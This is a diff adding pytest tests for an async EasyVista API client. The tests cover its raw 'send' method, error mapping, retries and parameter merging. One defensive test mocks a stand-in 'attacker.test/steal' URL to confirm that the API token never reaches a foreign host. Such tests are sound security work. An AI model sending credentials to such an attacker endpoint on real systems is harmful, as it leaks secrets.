@@ -19,8 +19,14 @@ import respx
 
 from easyvista_python_client._async import client as client_module
 from easyvista_python_client._async.client import AsyncEasyvistaClient
+from easyvista_python_client.config import EasyvistaConfig
 from easyvista_python_client.directory import DepartmentContext
-from easyvista_python_client.exceptions import EasyvistaAuthError, EasyvistaError
+from easyvista_python_client.exceptions import (
+    EasyvistaAuthError,
+    EasyvistaError,
+    EasyvistaServerError,
+    EasyvistaValidationError,
+)
 from easyvista_python_client.models.action import ActionUpdate, PostAction
 from easyvista_python_client.models.asset import PostAsset
 from easyvista_python_client.models.department import (
@@ -1609,3 +1615,141 @@ async def test_get_department_context_rejects_blank_department_id(config):
         with pytest.raises(ValueError, match="department_id is required"):
             await client.get_department_context(department_id)
     assert employees_route.call_count == 0
+
+
+# --- the escape hatch --------------------------------------------------------
+
+
+@respx.mock
+async def test_send_reaches_an_unwrapped_route_and_returns_raw_json(config):
+    # `status` is a reference table this package does not wrap. Nothing is
+    # validated into a model and no envelope is unwrapped: the caller owns the
+    # shape, which is the point.
+    route = respx.get(f"{ROOT}/status").mock(
+        return_value=httpx.Response(200, json={"records": [{"STATUS_ID": 8}]})
+    )
+    async with AsyncEasyvistaClient(config) as client:
+        assert await client.send("GET", "status") == {"records": [{"STATUS_ID": 8}]}
+    assert route.call_count == 1
+
+
+@respx.mock
+async def test_send_upper_cases_the_method_and_strips_a_leading_slash(config):
+    route = respx.get(f"{ROOT}/status").mock(return_value=httpx.Response(200, json={}))
+    async with AsyncEasyvistaClient(config) as client:
+        await client.send("get", "/status")
+    assert route.call_count == 1
+
+
+@respx.mock
+async def test_send_shares_the_error_mapping_and_retry_policy(config):
+    # Proves it rides the one transport path rather than a parallel one: 403
+    # maps, 590 maps and is NOT retried, 5xx IS retried.
+    respx.get(f"{ROOT}/known-errors").mock(return_value=httpx.Response(403))
+    async with AsyncEasyvistaClient(config) as client:
+        with pytest.raises(EasyvistaAuthError):
+            await client.send("GET", "known-errors")
+
+    rejected = respx.post(f"{ROOT}/problems").mock(
+        return_value=httpx.Response(590, json={"error": "nope", "error_code": 2013})
+    )
+    retried = respx.get(f"{ROOT}/licenses").mock(return_value=httpx.Response(503))
+    retrying = EasyvistaConfig(
+        server="https://ev.test", account="acme", token="tok", max_retries=2
+    )
+    async with AsyncEasyvistaClient(retrying) as client:
+        with pytest.raises(EasyvistaValidationError):
+            await client.send("POST", "problems", json={})
+        with pytest.raises(EasyvistaServerError):
+            await client.send("GET", "licenses")
+    assert rejected.call_count == 1  # 590 is deterministic, never retried
+    assert retried.call_count == 3  # 1 attempt + 2 retries
+
+
+@respx.mock
+async def test_send_puts_a_bare_list_body_on_the_wire(config):
+    # Pins the RequestSpec.json widening to Any: some unwrapped routes take a
+    # bare list, and httpx accepts anything JSON-serialisable.
+    route = respx.post(f"{ROOT}/groups").mock(return_value=httpx.Response(200, json={}))
+    async with AsyncEasyvistaClient(config) as client:
+        await client.send("POST", "groups", json=[{"a": 1}])
+    assert json.loads(route.calls.last.request.content) == [{"a": 1}]
+
+
+@respx.mock
+async def test_send_never_reaches_a_foreign_host(config):
+    # The credential stays scoped to the configured instance BY CONSTRUCTION:
+    # `path` is always joined to api_root, never treated as an absolute URL. So
+    # an absolute URL becomes a nonsense path under the instance rather than a
+    # request to the host it names -- and the token never leaves the instance.
+    foreign = respx.get("https://attacker.test/steal").mock(
+        return_value=httpx.Response(200, json={"stolen": True})
+    )
+    joined = respx.get(
+        f"{ROOT}/https://attacker.test/steal",
+    ).mock(return_value=httpx.Response(404, json={}))
+    async with AsyncEasyvistaClient(config) as client:
+        with pytest.raises(EasyvistaError):
+            await client.send("GET", "https://attacker.test/steal")
+    assert foreign.call_count == 0
+    assert joined.call_count == 1
+
+
+# --- per-call query parameters -----------------------------------------------
+
+
+@respx.mock
+async def test_search_tickets_sends_params_alongside_the_builders_own(config):
+    route = respx.get(f"{ROOT}/requests").mock(
+        return_value=httpx.Response(200, json={"records": []})
+    )
+    async with AsyncEasyvistaClient(config) as client:
+        await client.search_tickets(params={"formatDate": "iso"})
+    url = route.calls.last.request.url
+    assert url.params["formatDate"] == "iso"
+    assert url.params["max_rows"] == "100"
+
+
+@respx.mock
+async def test_a_caller_param_cannot_replace_the_builders_own(config):
+    # merge_params layers the spec LAST, so a caller cannot silently change what
+    # the method is actually asking for.
+    route = respx.get(f"{ROOT}/requests").mock(
+        return_value=httpx.Response(200, json={"records": []})
+    )
+    async with AsyncEasyvistaClient(config) as client:
+        await client.search_tickets(max_rows=10, params={"max_rows": 5})
+    assert route.calls.last.request.url.params["max_rows"] == "10"
+
+
+@respx.mock
+async def test_iter_tickets_still_advances_the_offset_when_params_override_it(config):
+    # The pagination hazard: a caller passing offset= must not stall the sweep.
+    # The builder's offset wins on every page, so this terminates.
+    respx.get(f"{ROOT}/requests").mock(
+        side_effect=[
+            httpx.Response(
+                200,
+                json={
+                    "records": [{"RFC_NUMBER": "I1"}, {"RFC_NUMBER": "I2"}],
+                    "@next": f"{ROOT}/requests?offset=2",
+                },
+            ),
+            httpx.Response(200, json={"records": [{"RFC_NUMBER": "I3"}]}),
+        ]
+    )
+    async with AsyncEasyvistaClient(config) as client:
+        seen = [t.rfc_number async for t in client.iter_tickets(params={"offset": 0})]
+    assert seen == ["I1", "I2", "I3"]
+
+
+@respx.mock
+async def test_list_actions_keeps_its_rfc_filter_when_a_caller_passes_search(config):
+    # ',' is a live combinator in this grammar, so a caller-supplied search that
+    # replaced the builder's filter could list another ticket's actions.
+    route = respx.get(f"{ROOT}/actions").mock(
+        return_value=httpx.Response(200, json={"records": []})
+    )
+    async with AsyncEasyvistaClient(config) as client:
+        await client.list_actions("I1", params={"search": 'RFC_NUMBER:"other"'})
+    assert route.calls.last.request.url.params["search"] == 'REQUEST.RFC_NUMBER:"I1"'
